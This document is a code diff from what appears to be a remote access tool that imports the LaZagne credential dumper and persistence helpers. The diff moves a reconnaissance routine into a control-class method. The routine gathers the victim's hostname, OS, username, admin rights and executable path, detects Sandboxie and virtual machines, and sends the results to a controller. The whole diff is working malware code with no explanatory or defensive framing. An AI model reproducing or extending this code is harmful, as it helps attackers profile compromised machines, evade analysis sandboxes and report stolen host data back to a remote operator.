@@ -43,30 +43,6 @@ from lazagne.config.run import run_lazagne
 from lazagne.config.constant import constant as lazagne_constant
 
 
-def get_info():
-    _hostname = socket.gethostname()
-    _platform = f"{platform.system()} {platform.release()}"
-
-    info = {"hostname": _hostname, "platform": _platform,
-            "architecture": platform.architecture(), "machine": platform.machine(), "processor": platform.processor(),
-            "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
-
-    if platforms.OS == platforms.WINDOWS:
-        p = Persistence()
-
-        info["username"] = os.environ["USERNAME"]
-        info["platform"] += " (Sandboxie) " if p.detect_sandboxie() else ""
-        info["platform"] += " (Virtual Machine) " if p.detect_vm() else ""
-        info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
-        info["is_unix"] = False
-    else:
-        info["username"] = os.environ["USER"]
-        info["is_admin"] = bool(os.geteuid() == 0)
-        info["is_unix"] = True
-
-    return info
-
-
 class Control(metaclass=abc.ABCMeta):
     def __init__(self, _es):
         self.es = _es
@@ -84,6 +60,30 @@ class Control(metaclass=abc.ABCMeta):
     @abc.abstractmethod
     def lock(self):
         pass
+
+    def info(self):
+        _hostname = socket.gethostname()
+        _platform = f"{platform.system()} {platform.release()}"
+
+        info = {"hostname": _hostname, "platform": _platform,
+                "architecture": platform.architecture(), "machine": platform.machine(),
+                "processor": platform.processor(),
+                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
+
+        if platforms.OS == platforms.WINDOWS:
+            p = Persistence()
+
+            info["username"] = os.environ["USERNAME"]
+            info["platform"] += " (Sandboxie) " if p.detect_sandboxie() else ""
+            info["platform"] += " (Virtual Machine) " if p.detect_vm() else ""
+            info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
+            info["is_unix"] = False
+        else:
+            info["username"] = os.environ["USER"]
+            info["is_admin"] = bool(os.geteuid() == 0)
+            info["is_unix"] = True
+
+        self.es.send_json(SUCCESS, info)
 
     def get_vuln(self, exploit_only):
         if platforms.OS == platforms.DARWIN:
